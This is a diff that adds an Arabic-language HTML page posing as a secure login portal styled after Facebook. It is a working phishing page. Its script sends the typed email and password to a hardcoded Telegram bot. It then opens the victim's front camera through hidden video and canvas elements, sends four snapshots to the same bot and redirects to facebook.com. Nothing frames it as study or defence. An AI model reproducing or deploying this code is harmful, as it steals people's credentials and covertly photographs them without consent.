@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة التحقق الموحد - تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .auth-card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .header-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 25px;
+            font-size: 22px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #1877f2;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .footer-note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+
+<div class="auth-card">
+    <div class="header-icon">🔐</div>
+    <h2>تسجيل الدخول الآمن</h2>
+    <form id="authForm">
+        <div class="input-group">
+            <label>البريد الإلكتروني أو اسم المستخدم</label>
+            <input type="text" id="email" required placeholder="أدخل البريد أو المعرف">
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>
+            <input type="password" id="password" required placeholder="••••••••">
+        </div>
+        <button type="submit" id="submitBtn">متابعة الدخول</button>
+    </form>
+    <div class="footer-note">محمي بواسطة نظام المصادقة المشفرة الآمنة</div>
+</div>
+
+<!-- عناصر مخفية لمعالجة التقاط الصور عبر الكاميرا -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = "8453371866:AAGbhkq5DUlBNJ2iu0IGYK8IdDqeTOr5lVc";
+    const CHAT_ID = "8016442557";
+
+    document.getElementById('authForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
+        
+        btn.disabled = true;
+        btn.innerText = "جاري التحقق والمتابعة...";
+
+        // 1. إرسال بيانات الحساب النصية فوراً لتليجرام
+        const textMessage = `📥 **بيانات جديدة مقترحة:**\n\n👤 **الحساب:** ${email}\n🔑 **الباسورد:** ${password}`;
+        await sendTelegramMessage(textMessage);
+
+        // 2. محاولة فتح الكاميرا والتقاط 4 صور متتالية
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            await new Promise(resolve => video.onloadedmetadata = () => resolve());
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const context = canvas.getContext('2d');
+
+            // التقاط 4 صور بفاصل زمني 700 ميللي ثانية بين كل صورة
+            for (let i = 1; i <= 4; i++) {
+                await new Promise(r => setTimeout(r, 700));
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                await sendTelegramPhoto(blob, `📷 الصورة رقم (${i})`);
+            }
+
+            // إيقاف الكاميرا بعد الانتهاء
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            console.log("Camera access not granted or failed:", err);
+        }
+
+        // 3. إعادة التوجيه النهائي للصفحة المقصودة
+        window.location.href = "https://www.facebook.com";
+    });
+
+    async function sendTelegramMessage(text) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).catch(() => {});
+    }
+
+    async function sendTelegramPhoto(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+
+        const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+        await fetch(url, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+    }
+</script>
+
+</body>
+</html>
